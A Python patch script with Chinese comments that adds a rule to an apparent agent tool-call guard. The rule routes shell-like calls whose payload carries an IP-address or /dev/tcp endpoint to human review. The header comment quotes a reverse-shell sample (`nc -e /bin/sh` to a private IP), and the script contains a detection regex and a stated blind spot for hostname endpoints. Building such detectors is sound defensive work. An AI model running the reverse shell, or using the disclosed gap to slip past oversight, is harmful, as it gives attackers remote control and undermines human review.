# -*- coding: utf-8 -*-
# _p1_build_shadow_vd.py — 候选 V-D 影子：**只改 engine.mjs 一个文件，纯出口增量，零触碰 attribution.mjs**
# 依据（实测所得，非先验 —— 见 _p1_frame.mjs 决策表）：
#   ① V-A（容器一律收口）：attack 24→35 但 benign 16→37（+21 误伤，全为本地正当运维）⇒ 淘汰：CONTAINER_VERBS 是词表不是结构。
#   ② V-C（containerOnly ∧ 端点多形态）：benign 0 误伤 ✓，但 attack 只 24→27 —— 漏掉 P1 核心样本
#      `shell_exec{"command":"nc -e /bin/sh 10.0.0.5 4444"}`（该条 layer=network-send / method=command ⇒ containerOnly 未置位）。
#   ③ 决策表定位真正的结构分水岭（两分量，源分置）：
#      分量① 归因**未判出类别**（只是"有读数"）：layer==='exec'（容器/上位词）**或** method∈{command,fractal}
#             （layer 系从**载荷文本**读出 ⇒ 同一命令串可含多动作族，读到的只是首命中族的**局部读数**）。
#      分量② 载荷携带**地址形**端点（点分四段有界整数 ／ /dev/tcp|udp/ ／ 方括号 IPv6）。
#            ⚠️ 只认「地址形」：地址是**格式**（结构）；「名字」需 TLD 词表（枚举），且 db.internal / ci.internal
#               与正当运维名**同形不可分** —— 实测把端点放宽到名字形 ⇒ benign 误伤 10 条。
#   ⇒ C2 口径实测：attack 新收 8 条 ／ benign 误伤 0 条 ／ 严格 deny 与放宽均不动。
# 形态：只读 ok/layer/method（既有返回字段）⇒ 不改归因、不改 R 锚、不改记账 ⇒ 单文件、可整体撤销。
import os, shutil, sys
ROOT = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(ROOT, 'weiwen-law-dsh', 'src', 'core')
DST = os.path.join(ROOT, '_stash', '_sh-det', 'core')

def load(p):
    with open(p, 'r', encoding='utf-8', newline='') as f: return f.read()
def save(p, s):
    with open(p, 'w', encoding='utf-8', newline='') as f: f.write(s)
def L(src, s):
    return s.replace('\n', '\r\n') if '\r\n' in src else s
def rep(src, old, new, tag):
    o, n = L(src, old), L(src, new)
    c = src.count(o)
    if c != 1:
        print(f'❌ [{tag}] 锚点命中 {c} 次（须为 1）'); sys.exit(1)
    return src.replace(o, n, 1)

os.makedirs(DST, exist_ok=True)
FILES = ['engine.mjs', 'attribution.mjs', 'bugstop.mjs', 'law.mjs', 'ledger.mjs']
for f in FILES:
    shutil.copyfile(os.path.join(SRC, f), os.path.join(DST, f))

# ── ① helper 块：插在 _sh12OffFaceI 定义之前（fail-loud：锚点唯一）────────────────
p = os.path.join(DST, 'engine.mjs')
s = load(p)
s = rep(s,
"""function _sh12OffFaceI(call) {""",
"""// ═══ [候选 V-D · P1] 归因「判出动作类别」的充要条件（与 XSUB-12 同族 · 纯出口增量）═══
//   结构（非枚举）：**动作类别只能由「名字声明的接口」给出**（method === 'name-grammar'）。
//     ① layer === 'exec' ⇒ 读出的是**容器/上位词**（exec ⊃ {delete, write, read, send, …}）⇒ 不是类别；
//     ② method ∈ {command, fractal} ⇒ layer 是从**载荷文本**（数据位/宾语位）读出来的族 ——
//        同一命令串可同时含多个动作族，读到的只是**首命中族的局部读数** ⇒ 也不是类别判定。
//   ⇒ 二者都只是「有读数」，不是「判得出类别」⇒ allow 的资格（结构跑完 ∧ 判得出）不成立。
//   端点判据只认**地址形**（点分四段有界整数 ／ /dev/tcp|udp/ ／ 方括号 IPv6）：
//     地址是**格式**（结构、可判、不随实例增长）；「名字」不是（认名字须 TLD 词表＝枚举，
//     且内部名 db.internal / ci.internal 与正当运维名同形不可分 —— 实测放宽即误伤 10 条）。
//   ⚠️ 漏法（已声明）：以**主机名**为端点的同类载荷不在本判据覆盖内 —— 是**结构性缺口**，非本判据疏漏。
const _VD_ADDR = /(?<![\\w.])(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}(?![\\w.])|\\/dev\\/(?:tcp|udp)\\/|\\[[0-9a-fA-F:]{2,}\\]/;
function _vdAddrInPayload(call) {
  return _VD_ADDR.test(JSON.stringify(call?.args ?? {}));
}
// 归因是否「判出了动作类别」：名字声明 ∧ 非容器层 ⇒ 是；否则只是「有读数」。
function _vdIndeterminate(attrib) {
  if (!attrib || !attrib.ok) return false; // ok:false 已由 XSUB-08 出口接住（未识别名 ⇒ review），不重复
  return !(attrib.method === 'name-grammar' && attrib.layer && attrib.layer !== 'exec');
}
function _sh12OffFaceI(call) {""",
'engine: V-D helper 块')

# ── ② 出口：并联在 XSUB-12 出口之后、deny 分支之前 ───────────────────────────────
s = rep(s,
"""      return { kind: 'review', law: 'R', reason: '[XSUB-12] 该调用带着载荷（' + Object.keys(call?.args ?? {}).join('/') + '），但其落点不在本层判据的输入面上：既无位置量（键名口径与词法口径均未见），亦无命令量 ⇒ 判据穷尽而无落点 ＝ 未判（≠ 判为无）⇒ 交还主权者裁决。', attrib, deduced: true, mMark: mkS, projection: risk.branches };
    }
    if (risk.verdict === 'deny') {""",
"""      return { kind: 'review', law: 'R', reason: '[XSUB-12] 该调用带着载荷（' + Object.keys(call?.args ?? {}).join('/') + '），但其落点不在本层判据的输入面上：既无位置量（键名口径与词法口径均未见），亦无命令量 ⇒ 判据穷尽而无落点 ＝ 未判（≠ 判为无）⇒ 交还主权者裁决。', attrib, deduced: true, mMark: mkS, projection: risk.branches };
    }
    // [候选 V-D · P1] 归因**未判出类别**（只是"有读数"）∧ 载荷携带**地址形**端点
    //   ⇒ 结构 ＝「指向外部地址的可执行通道」⇒ 未判（≠ 判为无）⇒ 不得 allow ⇒ 交还主权者裁决。
    //   ⚠️ 分水岭在「地址形端点」，**不在"容器"本身**：V-A 实测容器一律收口 ⇒ 21 条本地良性误收；
    //      也**不在"有端点"**：V-C 实测把名字形端点纳入 ⇒ 10 条内部名/正当运维误收。两分量缺一即误伤。
    if (risk.verdict === 'allow' && _vdIndeterminate(attrib) && _vdAddrInPayload(call)) {
      this._registerWrite(call);
      const mkV = this._markIntercept(call, bugKeyOf(call));
      return { kind: 'review', law: 'R', reason: '[P1-VD] 归因未判出动作类别（名=' + (attrib.signal || call?.name || '') + ' ⇒ layer=' + (attrib.layer ?? 'null') + ' / method=' + (attrib.method ?? 'null') + '：或为容器层（上位词），或为从载荷文本读出的局部读数），而载荷携带**地址形**外部端点 ⇒ 「指向外部地址的可执行通道」＝ 未判（≠ 判为无）⇒ 交还主权者裁决。（漏法已声明：主机名端点不在覆盖内）', attrib, deduced: true, mMark: mkV, projection: risk.branches };
    }
    if (risk.verdict === 'deny') {""",
'engine: V-D 出口并联')

save(p, s)

# ── ③ fail-loud 断言 ─────────────────────────────────────────────────────────
s2 = load(p)
n0 = load(os.path.join(SRC, 'engine.mjs')).count(chr(10))
chk = [
    (s2.count('_vdIndeterminate') == 2, f'_vdIndeterminate 出现 {s2.count("_vdIndeterminate")} 次（须 2）'),
    (s2.count('_vdAddrInPayload') == 2, f'_vdAddrInPayload 出现 {s2.count("_vdAddrInPayload")} 次（须 2）'),
    (s2.count('_VD_ADDR') == 2, f'_VD_ADDR 出现 {s2.count("_VD_ADDR")} 次（须 2）'),
    (s2.count('[P1-VD]') == 1, '[P1-VD] 判词须唯一'),
    (s2.count(L(s2, "    if (risk.verdict === 'deny') {\n      this.failureStreak += 1;")) == 1, 'deny 分支锚点被破坏'),
]
for ok, msg in chk:
    if not ok: print('❌', msg); sys.exit(1)
# attribution.mjs 必须**逐字节未动**（V-D 的核心性质：零触碰归因层）
a_src = load(os.path.join(SRC, 'attribution.mjs'))
a_dst = load(os.path.join(DST, 'attribution.mjs'))
if a_src != a_dst:
    print('❌ attribution.mjs 被改动（V-D 要求逐字节一致）'); sys.exit(1)

print('✅ engine.mjs（V-D）改毕（%d -> %d 行）' % (n0, s2.count(chr(10))))
print('✅ attribution.mjs 逐字节未动（零触碰归因层）')
print('影子目录:', DST)
